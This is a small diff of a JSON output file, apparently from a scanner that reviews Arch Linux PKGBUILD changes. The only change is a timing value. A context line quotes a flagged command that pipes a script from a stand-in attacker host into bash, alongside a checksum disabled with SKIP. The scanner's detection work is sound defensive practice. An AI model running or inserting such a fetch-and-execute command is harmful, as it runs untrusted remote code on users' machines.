@@ -346,6 +346,6 @@
       "verdict": "This analysis was incomplete: the repository file manifest was unavailable, so only the PKGBUILD was examined, and the installed rules.toml differs from the shipped rule set in a field that changes what a rule detects, so this analysis did not run the checks this version documents. The result describes what was examined, not the whole change. Version unchanged. modified PKGBUILD; added 1 source URL(s). Signals: Remote Script Execution:   curl -fsSL https://evil.example/stage.sh | bash [R001]; checksum set to SKIP [H001]; Source URL classified as unknown (https://evil.example/stage.sh) [SOURCE_BUCKET]; Uses curl in PKGBUILD: +  curl -fsSL https://evil.example/stage.sh | bash [R010]. Review the diff before building.",
       "version_comparison": ""
     },
-    "wall_clock_ms": 1018
+    "wall_clock_ms": 1545
   }
 }
